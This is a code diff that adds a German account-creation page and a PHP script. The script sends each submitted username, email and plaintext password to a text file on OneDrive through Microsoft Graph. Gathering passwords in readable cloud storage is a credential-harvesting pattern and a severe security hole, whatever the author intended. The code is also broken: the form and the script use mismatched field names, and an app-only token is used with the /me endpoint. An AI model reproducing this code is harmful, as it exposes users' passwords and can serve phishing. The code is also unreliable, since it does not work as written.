@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konto erstellen</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        form {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            background-color: #C3A683;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #b5916b;
+        }
+    </style>
+    <script>
+        async function sendData(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const confirmPassword = document.getElementById('confirm-password').value;
+
+            const data = {
+                username: username,
+                email: email,
+                password: password,
+                confirmPassword: confirmPassword
+            };
+
+            try {
+                const response = await fetch('send_data.php', { // PHP Datei auf deinem Server
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    alert('Konto erfolgreich erstellt!');
+                } else {
+                    alert('Fehler beim Erstellen des Kontos.');
+                }
+            } catch (error) {
+                console.error('Fehler:', error);
+                alert('Ein Fehler ist aufgetreten.');
+            }
+        }
+    </script>
+</head>
+<body>
+
+<h2>Konto erstellen</h2>
+<form onsubmit="sendData(event)">
+    <label for="username">Benutzername:</label>
+    <input type="text" id="username" name="username" required>
+
+    <label for="email">E-Mail:</label>
+    <input type="email" id="email" name="email" required>
+
+    <label for="password">Passwort:</label>
+    <input type="password" id="password" name="password" required>
+
+    <label for="confirm-password">Passwort bestätigen:</label>
+    <input type="password" id="confirm-password" name="confirm-password" required>
+
+    <input type="submit" value="Konto erstellen">
+</form>
+
+</body>
+</html>
+<?php
+require_once 'vendor/autoload.php';
+
+use Microsoft\Graph\Graph;
+use Microsoft\Graph\Model;
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $data = json_decode(file_get_contents("php://input"), true);
+
+    $clientId = 'DEINE_CLIENT_ID';
+    $clientSecret = 'DEIN_CLIENT_SECRET';
+    $tenantId = 'DEIN_TENANT_ID';
+    $guzzle = new \GuzzleHttp\Client();
+    $url = 'https://login.microsoftonline.com/' . $tenantId . '/oauth2/v2.0/token';
+
+    $token = json_decode($guzzle->post($url, [
+        'form_params' => [
+            'client_id' => $clientId,
+            'client_secret' => $clientSecret,
+            'scope' => 'https://graph.microsoft.com/.default',
+            'grant_type' => 'client_credentials',
+        ],
+    ])->getBody()->getContents());
+
+    $accessToken = $token->access_token;
+
+    $graph = new Graph();
+    $graph->setAccessToken($accessToken);
+
+    $content = "Benutzername: " . $data['username'] . "\n" .
+               "E-Mail: " . $data['email'] . "\n" .
+               "Passwort: " . $data['password'] . "\n" .
+               "Passwort bestätigen: " . $data['confirm-password'];
+
+    try {
+        $graph->createRequest("PUT", "/me/drive/root:/kontodaten.txt:/content")
+            ->attachBody($content)
+            ->execute();
+        http_response_code(200);
+        echo json_encode(["message" => "Daten erfolgreich an OneDrive hochgeladen!"]);
+    } catch (Exception $e) {
+        http_response_code(500);
+        echo json_encode(["message" => "Fehler beim Hochladen der Daten: " . $e->getMessage()]);
+    }
+}
+?>
